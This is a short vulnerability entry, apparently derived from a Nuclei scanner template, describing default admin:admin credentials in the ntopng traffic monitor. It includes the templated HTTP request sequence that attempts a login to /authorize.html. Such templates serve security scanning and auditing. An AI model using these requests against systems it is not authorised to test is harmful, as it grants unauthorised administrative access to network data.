# Vulnerability: ntopng - Default Login
**Classification:** NTOPNG
**Source:** Nuclei Template (`ntopng-default-login.yaml`)

## Description
Detected the ntopng network traffic monitoring tool was found to be using default credentials (admin:admin). An attacker could have gained full administrative access to network traffic data, flow analysis, and system configuration.

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

POST /authorize.html HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

user={{username}}&password={{password}}&referer=%2F

GET / HTTP/1.1
Host: {{Hostname}}
```

